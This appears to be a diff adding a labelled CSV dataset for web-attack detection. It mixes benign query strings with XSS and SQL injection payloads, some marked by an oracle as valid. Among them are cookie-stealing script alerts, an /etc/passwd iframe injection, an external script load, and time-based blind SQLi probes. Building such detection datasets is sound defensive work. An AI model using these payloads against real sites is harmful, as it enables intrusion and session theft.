@@ -1,0 +1,264 @@
+payload,label,oracle,obf_payload,techniques,unchanged
+price_min=1167&qty=8200&price_max=8681,benign,n/a,,,False
+theme=dark&search=orders,benign,n/a,,,False
+"alert(""test"")",xss,invalid,,,False
+or pg_SLEEP(5)--,sqli,invalid,,,False
+qty=4948&lang=en,benign,n/a,,,False
+<iframe src=http://xss.rocks/scriptlet.html <,xss,invalid,,,False
+ORDER BY 3,sqli,invalid,,,False
+"benchmark(10000000,MD5(1))#",sqli,invalid,,,False
+tab=report,benign,n/a,,,False
+email=book@example.com&currency=usd,benign,n/a,,,False
+callback=profile&currency=usd&q=settings,benign,n/a,,,False
+color=foxtrot,benign,n/a,,,False
+offset=7362,benign,n/a,,,False
+"benchmark(50000000,MD5(1))#",sqli,invalid,,,False
+ORDER BY 20,sqli,invalid,,,False
+'));waitfor delay '0:0:5'--,sqli,error,,,False
+user_id=6816,benign,n/a,,,False
+tab=dashboard,benign,n/a,,,False
+"<img src=""xxx"" onerror=""document.write('\<iframe src=file:///etc/passwd>\</iframe>')""/>",xss,valid,,,False
+city=citra&q=surakarta&search=book,benign,n/a,,,False
+id=6671&offset=9153&search=orders,benign,n/a,,,False
+\,sqli,invalid,,,False
+session=3691889&callback=profile,benign,n/a,,,False
+"""><svg><script>alert(1)</script>",xss,valid,,,False
+currency=usd&price_min=945&id=7479,benign,n/a,,,False
+search=invoice,benign,n/a,,,False
+size=m&lang=id&search=laptop,benign,n/a,,,False
+offset=50&view=grid,benign,n/a,,,False
+ORDER BY 24,sqli,invalid,,,False
+qty=3250&format=json,benign,n/a,,,False
+tab=laptop,benign,n/a,,,False
+WHERE 1=1 AND 1=1,sqli,invalid,,,False
+<sCript>alert(document.domain)</sCript>,xss,valid,,,False
+AS INJECTX WHERE 1=1 AND 1=1--,sqli,invalid,,,False
+color=laptop,benign,n/a,,,False
+theme=dark&view=grid,benign,n/a,,,False
+name=delta,benign,n/a,,,False
+<audio src/onerror=confirm(123)>,xss,valid,,,False
+%' AND 8310=8310 AND '%'=',sqli,invalid,,,False
+category=book&ref=citra&lang=en,benign,n/a,,,False
+qty=7470&user_id=8588,benign,n/a,,,False
+redirect=/home&price_max=6732&tab=foxtrot,benign,n/a,,,False
+search=echo,benign,n/a,,,False
+offset=2527,benign,n/a,,,False
+price_min=2435&size=m&email=delta@example.com,benign,n/a,,,False
+OR x=y--,sqli,invalid,,,False
+ORDER BY 31337,sqli,invalid,,,False
+name=book,benign,n/a,,,False
+page=3922&tab=budget&currency=usd,benign,n/a,,,False
+size=m&token=122f063,benign,n/a,,,False
+AND 1,sqli,invalid,,,False
+ORDER BY 21,sqli,invalid,,,False
+ref=laptop&size=m&lang=en,benign,n/a,,,False
+ORDER BY 7,sqli,invalid,,,False
+ORDER BY 2,sqli,invalid,,,False
+format=json&lang=id&coupon=surakarta,benign,n/a,,,False
+ORDER BY 4,sqli,invalid,,,False
+format=json&price_min=6036,benign,n/a,,,False
+price_max=9273&tab=dashboard&sort=desc,benign,n/a,,,False
+currency=usd&sort=asc&user_id=1209,benign,n/a,,,False
+callback=shoes&price_max=5861&sort=asc,benign,n/a,,,False
+token=3d92027,benign,n/a,,,False
+<script>alert(1)</script>,xss,valid,,,False
+category=invoice,benign,n/a,,,False
+ORDER BY 12,sqli,invalid,,,False
+lang=en&redirect=/home&qty=816,benign,n/a,,,False
+page=6451&name=citra&lang=id,benign,n/a,,,False
+ORDER BY 9,sqli,invalid,,,False
+"<script>alert(""test"");</script>",xss,valid,,,False
+lang=en&price_max=2911,benign,n/a,,,False
+view=grid&name=jakarta,benign,n/a,,,False
+prompt(document.cookie),xss,invalid,,,False
+coupon=book&callback=report,benign,n/a,,,False
+AND 7300=7300 AND ('pKlZ'='pKlZ,sqli,error,,,False
+<BODY ONLOAD=alert(document.cookie)>,xss,valid,,,False
+user_id=4106,benign,n/a,,,False
+price_max=853&format=json&size=m,benign,n/a,,,False
+token=404b88a,benign,n/a,,,False
+"-1 UNION SELECT 1 INTO @,@",sqli,invalid,,,False
+session=203f2d2&view=grid&q=delta,benign,n/a,,,False
+category=orders&ref=jakarta&price_min=4307,benign,n/a,,,False
+sort=asc&size=m,benign,n/a,,,False
+city=shoes&limit=526&size=m,benign,n/a,,,False
+ref=shoes&limit=6350&name=shoes,benign,n/a,,,False
+"<script src=""http://192.168.1.6/test.js"" ></script>",xss,valid,,,False
+ORDER BY 6,sqli,invalid,,,False
+ORDER BY 11,sqli,invalid,,,False
+tab=budget&coupon=dashboard&format=json,benign,n/a,,,False
+"<img src=""abc"" onerror=""alert(1)"">",xss,valid,,,False
+></select><img%20src=1%20onerror=alert(1)>,xss,valid,,,False
+AND 7300=7300 AND 'pKlZ'='pKlZ,sqli,error,,,False
+price_max=4107,benign,n/a,,,False
+ORDER BY 25,sqli,invalid,,,False
+ORDER BY 5,sqli,invalid,,,False
+email=foxtrot@example.com,benign,n/a,,,False
+color=surakarta&format=json,benign,n/a,,,False
+name=dashboard&theme=dark,benign,n/a,,,False
+theme=dark&lang=id&ref=alice,benign,n/a,,,False
+price_max=619,benign,n/a,,,False
+OR 1=1--,sqli,invalid,,,False
+user_id=7171,benign,n/a,,,False
+redirect=/home&category=book&search=jakarta,benign,n/a,,,False
+/,sqli,invalid,,,False
+q=echo,benign,n/a,,,False
+&&SLEEP(5),sqli,invalid,,,False
+' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --,sqli,error,,,False
+sort=desc&token=2777484&lang=id,benign,n/a,,,False
+size=m&session=22179f5,benign,n/a,,,False
+format=json&coupon=foxtrot,benign,n/a,,,False
+theme=dark&size=m&redirect=/home,benign,n/a,,,False
+email=echo@example.com&token=32e84b3&redirect=/home,benign,n/a,,,False
+ORDER BY 26,sqli,invalid,,,False
+q=report&price_max=6485,benign,n/a,,,False
+"<link rel=attachment href=""file:///etc/passwd"">",xss,invalid,,,False
+offset=8999,benign,n/a,,,False
+<iframe onload=print()></iframe>,xss,valid,,,False
+callback=alice&city=camera&limit=1011,benign,n/a,,,False
+ORDER BY 8,sqli,invalid,,,False
+"""><script>alert(1)</script>",xss,valid,,,False
+format=json,benign,n/a,,,False
+offset=9968,benign,n/a,,,False
+ORDER BY 13,sqli,invalid,,,False
+price_max=481&limit=7729,benign,n/a,,,False
+AND true,sqli,invalid,,,False
+';waitfor delay '0:0:5'--,sqli,uncertain,,,False
+city=laptop&name=delta&session=331056d,benign,n/a,,,False
+IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--,sqli,invalid,,,False
+price_max=2505,benign,n/a,,,False
+ORDER BY 28,sqli,invalid,,,False
+ORDER BY SLEEP(5)#,sqli,invalid,,,False
+theme=dark&color=orders,benign,n/a,,,False
+"<body style=""background-color:red"">",xss,invalid,,,False
+"' or """,sqli,error,,,False
+view=grid&lang=id&search=delta,benign,n/a,,,False
+');waitfor delay '0:0:5'--,sqli,error,,,False
+price_max=508&currency=usd&email=shoes@example.com,benign,n/a,,,False
+';alert('1');',xss,invalid,,,False
+ORDER BY 22,sqli,invalid,,,False
+page=5214&search=camera&price_max=2305,benign,n/a,,,False
+sort=desc&theme=dark&color=alice,benign,n/a,,,False
+name=phone,benign,n/a,,,False
+ORDER BY 19,sqli,invalid,,,False
+""" OR """" = """,sqli,invalid,,,False
+session=31b7cb4&sort=asc,benign,n/a,,,False
+prompt(123),xss,invalid,,,False
+1 or sleep(5)#,sqli,invalid,,,False
+size=m&id=2589,benign,n/a,,,False
+HAVING 1=1#,sqli,invalid,,,False
+tab=foxtrot,benign,n/a,,,False
+redirect=/home&price_max=1597&email=invoice@example.com,benign,n/a,,,False
+page=6071&format=json,benign,n/a,,,False
+"1' ORDER BY 1,2--+",sqli,invalid,,,False
+ORDER BY 17,sqli,invalid,,,False
+view=grid&id=6069&currency=usd,benign,n/a,,,False
+lang=en&session=57ce51b,benign,n/a,,,False
+ref=budi&lang=id&view=grid,benign,n/a,,,False
+id=8741&email=delta@example.com&search=settings,benign,n/a,,,False
+--><img src=x onerror=confirm(document.domain)>,xss,valid,,,False
+"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",xss,valid,,,False
+ref=budi&search=settings,benign,n/a,,,False
+RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',sqli,error,,,False
+user_id=1295,benign,n/a,,,False
+currency=usd&redirect=/home,benign,n/a,,,False
+WHERE 1=1 AND 1=0,sqli,invalid,,,False
+"1' GROUP BY 1,2,--+",sqli,error,,,False
+theme=dark&sort=desc,benign,n/a,,,False
+format=json&user_id=2914&size=m,benign,n/a,,,False
+AND 0,sqli,invalid,,,False
+color=budi,benign,n/a,,,False
+ORDER BY 27,sqli,invalid,,,False
+ORDER BY 23,sqli,invalid,,,False
+city=delta&format=json&coupon=orders,benign,n/a,,,False
+id=5322&qty=7539,benign,n/a,,,False
+"benchmark(50000000,MD5(1))",sqli,invalid,,,False
+sort=asc&qty=437,benign,n/a,,,False
+offset=2436&token=4965162,benign,n/a,,,False
+<script>alert(document.domain)</script>,xss,valid,,,False
+OR x=x#,sqli,invalid,,,False
+theme=dark&sort=asc&price_max=673,benign,n/a,,,False
+',sqli,error,,,False
+ORDER BY 10,sqli,invalid,,,False
+theme=dark,benign,n/a,,,False
+session=520f8e5,benign,n/a,,,False
+token=1b29664&redirect=/home,benign,n/a,,,False
+callback=invoice,benign,n/a,,,False
+"""><iframe src='https://testforiframe.site/'>",xss,valid,,,False
+RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',sqli,error,,,False
+"<IMG SRC=""javascript:alert('XSS');"">",xss,valid,,,False
+color=book&tab=foxtrot,benign,n/a,,,False
+OR 1=0--,sqli,invalid,,,False
+search=phone,benign,n/a,,,False
+callback=citra,benign,n/a,,,False
+"or benchmark(50000000,MD5(1))#",sqli,invalid,,,False
+price_min=4273&name=budget&lang=en,benign,n/a,,,False
+AS INJECTX WHERE 1=1 AND 1=0--,sqli,invalid,,,False
+"or benchmark(50000000,MD5(1))--",sqli,invalid,,,False
+category=citra&offset=2030&lang=id,benign,n/a,,,False
+sort=desc&name=shoes,benign,n/a,,,False
+search=settings&lang=en&format=json,benign,n/a,,,False
+<marquee onstart=alert(1)></marquee>,xss,valid,,,False
+"""><script>alert(document.domain)</script>",xss,valid,,,False
+name=budget&id=7730&page=2459,benign,n/a,,,False
+city=shoes&q=shoes&session=5ee77af,benign,n/a,,,False
+size=m&qty=9325,benign,n/a,,,False
+q=jakarta&lang=en&coupon=citra,benign,n/a,,,False
+<Script>alert(1)</Script>,xss,valid,,,False
+redirect=/home&user_id=2880,benign,n/a,,,False
+lang=en&id=7103&theme=dark,benign,n/a,,,False
+HAVING 1=0#,sqli,invalid,,,False
+price_max=7917,benign,n/a,,,False
+--><script>alert(1)</script>,xss,valid,,,False
+currency=usd&page=8543,benign,n/a,,,False
+"1 or benchmark(10000000,MD5(1))#",sqli,invalid,,,False
+"<body onmouseover=""print()"">",xss,valid,,,False
+theme=dark&callback=delta,benign,n/a,,,False
+color=camera&offset=3049,benign,n/a,,,False
+color=foxtrot&email=jakarta@example.com,benign,n/a,,,False
+sort=asc&qty=8317,benign,n/a,,,False
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--,sqli,invalid,,,False
+ORDER BY 1,sqli,invalid,,,False
+waitfor delay '00:00:05'--,sqli,error,,,False
+ORDER BY 16,sqli,invalid,,,False
+session=4efdb02,benign,n/a,,,False
+IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--,sqli,invalid,,,False
+&lt;img src=0 onerror=alert(document.cookie)&gt;,xss,valid,,,False
+')) or pg_sleep(5)--,sqli,error,,,False
+AND 7300=7300 AND ('pKlZ'='pKlY,sqli,error,,,False
+name=profile&token=15e9771,benign,n/a,,,False
+' or pg_sleep(5)--,sqli,error,,,False
+view=grid&q=book&redirect=/home,benign,n/a,,,False
+tab=jakarta&view=grid&callback=orders,benign,n/a,,,False
+offset=1331,benign,n/a,,,False
+token=1003a3f&limit=4755,benign,n/a,,,False
+ORDER BY 30,sqli,invalid,,,False
+';WAITFOR DELAY '0:0:30'--,sqli,uncertain,,,False
+"<body style=""background-color:red !important;"">",xss,invalid,,,False
+ORDER BY 14,sqli,invalid,,,False
+ORDER BY 18,sqli,invalid,,,False
+search=foxtrot,benign,n/a,,,False
+qty=2003&city=shoes&lang=en,benign,n/a,,,False
+' UNION SELECT sum(columnname ) from tablename --,sqli,error,,,False
+"<img src="""" onerror=""alert(document.cookie)"">",xss,valid,,,False
+"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",xss,valid,,,False
+token=5b74eb1,benign,n/a,,,False
+format=json&session=583cdc0&search=profile,benign,n/a,,,False
+-- or #,sqli,invalid,,,False
+offset=5890&view=grid,benign,n/a,,,False
+""" OR 1 = 1 -- -",sqli,invalid,,,False
+theme=dark&coupon=book&email=citra@example.com,benign,n/a,,,False
+search=jakarta&currency=usd,benign,n/a,,,False
+price_max=7106,benign,n/a,,,False
+city=book&price_max=1295&q=delta,benign,n/a,,,False
+ORDER BY 29,sqli,invalid,,,False
+id=1355&format=json&search=shoes,benign,n/a,,,False
+));waitfor delay '0:0:5'--,sqli,error,,,False
+%' AND 8310=8311 AND '%'=',sqli,invalid,,,False
+currency=usd&name=orders,benign,n/a,,,False
+prompt(document.domain),xss,invalid,,,False
+price_max=1626,benign,n/a,,,False
+ORDER BY 15,sqli,invalid,,,False
+city=settings&color=citra,benign,n/a,,,False
+price_min=1642&redirect=/home&qty=5634,benign,n/a,,,False
+lang=id&tab=shoes&city=dashboard,benign,n/a,,,False
